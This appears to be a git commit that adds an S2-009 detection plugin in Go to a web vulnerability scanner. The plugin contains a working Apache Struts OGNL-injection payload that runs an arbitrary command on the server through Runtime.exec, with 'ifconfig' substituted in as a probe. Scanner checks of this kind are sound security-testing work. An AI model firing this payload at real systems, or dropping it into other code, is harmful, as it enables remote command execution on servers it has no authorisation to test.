b7911287f231ad47e3dce548eec5660df1fd9941
shaochuyu <shaochuyu@360.cn>
2024-01-05 23:54:26 +0800

    【plugins.struts】添加S2-009插件

--- core/plugins/struts/s2-009.go
+++ core/plugins/struts/s2-009.go
@@ -3,3 +3,50 @@
 * @Date: 5/7/2022 11:30
  */
 package struts
+
+import (
+	"context"
+	"strings"
+	"wscan/core/http"
+	"wscan/core/model"
+	"wscan/core/plugins/base"
+	"wscan/core/utils"
+	logger "wscan/core/utils/log"
+)
+
+var ExecPayload009 = "(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=+new+java.lang.Boolean(false),+%23_memberAccess[%22allowStaticMethodAccess%22]=true,+%23a=@java.lang.Runtime@getRuntime().exec(%27{cmd}%27).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[51020],%23c.read(%23d),%23kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23kxlzx.println(%23d),%23kxlzx.close())(meh)&z[({key})(%27meh%27)]"
+
+type S009 struct {
+}
+
+func (*S009) Finger() *base.Finger {
+	return &base.Finger{
+		CheckAction: func(ctx context.Context, ab *base.Apollo) error {
+			flow := ab.GetTargetFlow()
+			logger.Infof("开始检测S2-009, %s", flow.Request.URL())
+			payload := ExecPayload009
+			payload = strings.Replace(payload, "{cmd}", "ifconfig", -1)
+
+			req, err := http.NewRequest("GET", utils.UrlJoinPath(flow.Request.URL().String(), payload), nil)
+			if err != nil {
+				logger.Error(err)
+				return nil
+			}
+			res, err := ab.HTTPClient.Respond(context.TODO(), req)
+			if err != nil {
+				return nil
+			}
+			if strings.Contains(res.Text, "broadcast") {
+				v := ab.NewWebVuln(req, res, nil)
+				if v != nil {
+					v.SetTargetURL(flow.Request.URL())
+					v.Payload = payload
+					ab.OutputVuln(v)
+				}
+			}
+			return nil
+		},
+		Channel: "web-directory",
+		Binding: &model.VulnBinding{ID: "struts/s2-009/default", Plugin: "struts/s2-009", Category: "struts/s2-009"},
+	}
+}
